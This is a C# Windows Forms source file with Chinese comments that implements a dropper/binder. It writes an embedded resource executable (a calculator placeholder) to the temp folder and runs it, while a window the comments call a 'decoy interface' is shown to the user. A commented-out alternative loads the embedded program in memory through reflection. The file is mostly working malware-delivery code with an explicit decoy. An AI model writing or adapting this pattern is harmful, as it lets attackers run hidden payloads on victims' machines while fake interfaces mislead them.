using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    internal static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            string[] str;
            if (args != null && args.Length > 0)
                str = args;
            else
                str = new string[] { "没有获得参数，程序中定义的字符串。" };

            //获取Resources中添加的资源
            byte[] fileBytes = Properties.Resources.calc;


            //【方法1】进程外部启动新进程（将资源文件存储到磁盘并启动新进程），不受编译平台限制，所有类型APP文件都可以
            string fileName = System.IO.Path.GetTempPath(); //当前用户的local\temp目录
            if (fileName.EndsWith("\\"))
                fileName = fileName + "calc.exe";
            else
                fileName = fileName + "\\calc.exe";
            System.IO.BinaryWriter bw = new System.IO.BinaryWriter(new System.IO.FileStream(fileName, System.IO.FileMode.Create));
            bw.Write(fileBytes);
            bw.Flush();
            bw.Close();
            //启动进程
            System.Diagnostics.Process myPro = System.Diagnostics.Process.Start(fileName, str[0]);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1()); //诱饵界面弹出逻辑


           /* //【方法2】进程内部调用代码执行：
            //同一进程只能打开一个主窗体，否则会报错。【如果本进程已经开了主窗体，调用的代码中也有主窗体会报错】
            System.Reflection.Assembly asm = System.Reflection.Assembly.Load(fileBytes);//对加载的APP有要求，只能加载C#类型程序
            System.Reflection.MethodInfo info = asm.EntryPoint; //main方法对象，准备反射调用
            System.Reflection.ParameterInfo[] parameters = info.GetParameters();
            if ((parameters != null) && (parameters.Length > 0))
                info.Invoke(null, new object[] { str });//参数1是方法的对象，因为主主函数为静态函数没有对象所以为null；参数2是方法的参数对象列表，主函数一般是只有1个string[]参数对象
            else
                info.Invoke(null, null);*/
        }
    }
}
